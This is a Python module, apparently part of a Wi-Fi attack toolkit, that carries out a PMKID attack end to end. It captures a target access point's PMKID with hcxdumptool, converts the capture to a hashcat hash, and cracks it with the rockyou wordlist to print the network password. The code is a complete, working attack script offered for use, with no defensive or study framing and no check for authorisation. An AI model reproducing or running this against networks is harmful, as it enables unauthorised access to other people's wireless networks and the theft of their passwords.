#codex updated
#!/usr/bin/env python3
"""
pmkid.py — PMKID attack module
--------------------------------
Called from main.py as an alternative attack path to capture.py.
Does NOT require deauth or any connected clients.
"""

import os
import re
import gzip
import shutil
import subprocess
import time


# ─────────────────────────────────────────────
# CONSTANTS
# ─────────────────────────────────────────────
CAPTURES_DIR = "captures"
WORDLIST_GZ = os.path.join("wordlist", "rockyou.txt.gz")
WORDLIST_TXT = os.path.join("wordlist", "rockyou.txt")

CAPTURE_TIMEOUT = 60
CRACK_TIMEOUT = 300


# ─────────────────────────────────────────────
# HELPER: check a tool exists on PATH
# ─────────────────────────────────────────────
def _require(tool: str) -> None:
    package_names = {
        "hcxdumptool": "hcxdumptool",
        "hcxpcapngtool": "hcxtools",
        "hashcat": "hashcat",
    }

    if not shutil.which(tool):
        package = package_names.get(tool, tool)
        raise RuntimeError(
            f"[pmkid] Required tool '{tool}' not found. "
            f"Install it with: sudo apt install {package}"
        )


# ─────────────────────────────────────────────
# STEP 0: prepare wordlist
# ─────────────────────────────────────────────
def _prepare_wordlist() -> str:
    if os.path.exists(WORDLIST_TXT):
        print(f"[pmkid] Wordlist ready: {WORDLIST_TXT}")
        return WORDLIST_TXT

    if os.path.exists(WORDLIST_GZ):
        print(f"[pmkid] Decompressing {WORDLIST_GZ} ...")
        with gzip.open(WORDLIST_GZ, "rb") as f_in, open(WORDLIST_TXT, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)

        print(f"[pmkid] Wordlist ready: {WORDLIST_TXT}")
        return WORDLIST_TXT

    raise FileNotFoundError(
        "[pmkid] No wordlist found. Place rockyou.txt or rockyou.txt.gz in wordlist/."
    )


# ─────────────────────────────────────────────
# STEP 1: capture PMKID with hcxdumptool
# ─────────────────────────────────────────────
def _capture_pmkid(bssid: str, channel: str, iface: str, capture_dir: str) -> str:
    _require("hcxdumptool")

    pcapng_path = os.path.join(capture_dir, "pmkid_capture.pcapng")
    log_path = os.path.join(capture_dir, "hcxdumptool.log")

    bssid_clean = bssid.replace(":", "").lower()

    filterlist_path = os.path.join(capture_dir, "filterlist.txt")
    with open(filterlist_path, "w") as f:
        f.write(bssid_clean + "\n")

    cmd = [
        "hcxdumptool",
        "-i", iface,
        "-o", pcapng_path,
        "--filterlist_ap=" + filterlist_path,
        "--filtermode=2",
        "-c", str(channel),
        "--disable_client_attacks",
    ]

    print(f"\n[pmkid] Starting PMKID codex capture on {iface} (BSSID {bssid})")
    print(f"[pmkid] Channel: {channel} | Timeout: {CAPTURE_TIMEOUT}s")
    print("[pmkid] Waiting for AP to respond with PMKID frame ...")
    print(f"[pmkid] Log file: {log_path}")
    print("[pmkid] Press Ctrl+C to stop early.\n")

    proc = None

    try:
        with open(log_path, "w") as log_file:
            proc = subprocess.Popen(cmd, stdout=log_file, stderr=log_file)

            time.sleep(CAPTURE_TIMEOUT)

            if proc.poll() is None:
                proc.terminate()

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)

    except KeyboardInterrupt:
        print("\n[pmkid] Capture interrupted by user.")

        if proc and proc.poll() is None:
            proc.terminate()

    if not os.path.exists(pcapng_path) or os.path.getsize(pcapng_path) == 0:
        raise RuntimeError(
            "[pmkid] hcxdumptool produced no output.\n"
            f"       Check the log file: {log_path}\n"
            "       Possible causes:\n"
            "       - The interface is not really in monitor mode\n"
            "       - Another process is using the adapter\n"
            "       - The router/AP does not expose PMKID\n"
            "       - The AP is out of range or on a different channel\n"
        )

    print(f"[pmkid] Capture saved: {pcapng_path}")
    print(f"[pmkid] hcxdumptool log saved: {log_path}")

    return pcapng_path


# ─────────────────────────────────────────────
# STEP 2: convert pcapng to hashcat hash file
# ─────────────────────────────────────────────
def _convert_to_hash(pcapng_path: str, capture_dir: str) -> str:
    _require("hcxpcapngtool")

    hash_path = os.path.join(capture_dir, "pmkid.hc22000")

    cmd = [
        "hcxpcapngtool",
        "-o",
        hash_path,
        pcapng_path,
    ]

    print("[pmkid] Converting capture to hashcat format ...")

    result = subprocess.run(cmd, capture_output=True, text=True)

    if not os.path.exists(hash_path) or os.path.getsize(hash_path) == 0:
        print("[pmkid] hcxpcapngtool output:")
        print(result.stdout or "(no stdout)")
        print(result.stderr or "(no stderr)")

        raise RuntimeError(
            "[pmkid] No PMKID/EAPOL hashes were extracted from the capture.\n"
            "       This usually means the AP did not provide PMKID.\n"
            f"       Try increasing CAPTURE_TIMEOUT. Current value: {CAPTURE_TIMEOUT}s"
        )

    with open(hash_path) as f:
        count = sum(1 for line in f if line.strip())

    print(f"[pmkid] Extracted {count} hash(es) -> {hash_path}")

    return hash_path


# ─────────────────────────────────────────────
# STEP 3: crack with hashcat mode 22000
# ─────────────────────────────────────────────
def _crack_with_hashcat(hash_path: str, wordlist: str, target_name: str) -> dict:
    _require("hashcat")

    potfile = hash_path.replace(".hc22000", ".potfile")

    cmd = [
        "hashcat",
        "-m",
        "22000",
        "-a",
        "0",
        hash_path,
        wordlist,
        "--potfile-path",
        potfile,
        "--status",
        "--status-timer=10",
        "--force",
    ]

    print(f"\n[pmkid] Starting hashcat mode 22000 against {target_name} ...")
    print(f"[pmkid] Wordlist: {wordlist}")
    print(f"[pmkid] Timeout: {CRACK_TIMEOUT}s\n")

    start_time = time.time()
    keys_tried = 0

    proc = None

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        for line in proc.stdout:
            line = line.rstrip()

            if line:
                print(f"  {line}")

            match = re.search(r"Progress\.+:\s+([\d]+)/", line)

            if match:
                keys_tried = int(match.group(1))

            if time.time() - start_time > CRACK_TIMEOUT:
                print("\n[pmkid] Crack timeout reached.")

                if proc.poll() is None:
                    proc.terminate()

                break

        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)

    except KeyboardInterrupt:
        print("\n[pmkid] Cracking interrupted by user.")

        if proc and proc.poll() is None:
            proc.terminate()

    elapsed = time.time() - start_time

    password = None

    if os.path.exists(potfile):
        with open(potfile) as f:
            for line in f:
                line = line.strip()

                if ":" in line:
                    password = line.rsplit(":", 1)[-1]
                    break

    return {
        "found": password is not None,
        "password": password,
        "elapsed": elapsed,
        "keys_tried": keys_tried,
    }


# ─────────────────────────────────────────────
# MAIN PUBLIC FUNCTION — called from main.py
# ─────────────────────────────────────────────
def run_pmkid_attack(bssid: str, channel: str, iface: str, ssid: str) -> bool:
    print("\n" + "=" * 55)
    print("  PMKID ATTACK")
    print(f"  Target : {ssid} ({bssid})")
    print(f"  Channel: {channel} | Interface: {iface}")
    print("=" * 55)

    safe_ssid = "".join(c if c.isalnum() or c in "-_" else "_" for c in ssid)
    capture_dir = os.path.join(CAPTURES_DIR, f"{safe_ssid}_pmkid")

    os.makedirs(capture_dir, exist_ok=True)

    try:
        wordlist = _prepare_wordlist()
        pcapng = _capture_pmkid(bssid, channel, iface, capture_dir)
        hash_file = _convert_to_hash(pcapng, capture_dir)
        result = _crack_with_hashcat(hash_file, wordlist, ssid)

    except (RuntimeError, FileNotFoundError) as err:
        print(f"\n[pmkid] Attack failed:\n{err}")
        return False

    print("\n" + "=" * 55)
    print("  PMKID ATTACK SUMMARY")
    print("=" * 55)

    if result["found"]:
        print(f"  Password found : {result['password']}")
    else:
        print("  Password not found in wordlist.")

    print(f"  Time elapsed   : {result['elapsed']:.1f}s")
    print(f"  Keys tried     : {result['keys_tried']:,}")
    print(f"  Capture files  : {capture_dir}/")
    print("=" * 55 + "\n")

    return result["found"]
